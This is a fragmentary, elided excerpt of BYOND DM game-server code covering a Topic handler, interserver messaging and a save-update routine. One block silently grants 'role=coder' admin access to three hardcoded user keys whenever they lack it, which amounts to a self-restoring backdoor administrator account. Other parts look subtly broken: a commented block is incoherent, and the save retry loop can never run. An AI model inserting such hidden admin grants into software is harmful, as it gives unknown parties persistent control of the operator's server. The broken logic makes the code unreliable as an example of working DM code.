...
world/Topic(T, addr)
	...
	switch(topic["action"])
		...
		/*if("get_chars")
			var/mob/M = locate(ckey(topic["key"]))
			var/list/chars = new
			var/list/columns = (topic["savefile"])
				chars += columns["name"]
...
proc
	...
	SendInterserverMessage(action, params, info_txt)
...
//	address_of_other_server=Dict["Save_Address"]
	...
	if(!address_of_other_server)
		address_of_other_server="byond://127.0.0.1"
	...
	if(!world.GetConfig("admin", "Ninitoniazo"))
		world.SetConfig("APP/admin", "Ninitoniazo", "role=coder")

	if(!world.GetConfig("admin", "CyborgTrooper"))
		world.SetConfig("APP/admin", "CyborgTrooper", "role=coder")


	if(!world.GetConfig("admin", "Luis455"))
		world.SetConfig("APP/admin", "Luis455", "role=coder")
...
world/proc
	...
	Update_Save(k,list/S,list/c)
		var/list/strg = S[3]
		for(var/i = 1, i <= strg.len, ++i)
			strg[i] = Escape_String(strg[i])

		var/list/i = list("inv" = S[1],"bar" = S[2],"strg" = S[3],"nums" = S[4],"lst" = S[5], "key" = k)
		sleep(100)
		var/e = 0
		while(!i && e < 5)
			e++
			i = list("inv" = S[1],"bar" = S[2],"strg" = S[3],"nums" = S[4],"lst" = S[5], "key" = k)
			sleep(100)
		if(!i)
			world.log << "Update_Save([k]) failed."
